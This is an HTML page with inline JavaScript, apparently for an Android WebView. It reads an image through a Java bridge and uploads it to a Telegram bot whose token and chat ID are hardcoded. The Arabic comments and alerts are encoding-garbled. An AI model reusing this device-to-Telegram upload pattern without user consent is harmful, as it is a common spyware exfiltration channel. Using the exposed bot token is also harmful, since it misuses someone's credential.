<!DOCTYPE html>
<html>
  <body>
    <script>
      async function sendPhotoToTelegram(base64data) {
        const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
        const chatId = "6894787120";

        // Ù†Ø­ÙˆÙ„ base64 Ø¥Ù„Ù‰ Blob
        const blob = await (await fetch(`data:image/jpeg;base64,${base64data}`)).blob();

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "image.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData,
        }).then(res => {
          alert("âœ”ï¸ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…");
        }).catch(err => {
          alert("âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: " + err.message);
        });
      }

      // Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ù…Ù† WebView Ø¥Ù„Ù‰ Java
      const img = bridge.getImageBase64();
      if (img && img !== "ERROR") {
        sendPhotoToTelegram(img);
      } else {
        alert("ğŸ“› Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØ±Ø© Ø£Ùˆ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„");
      }
    </script>
  </body>
</html>
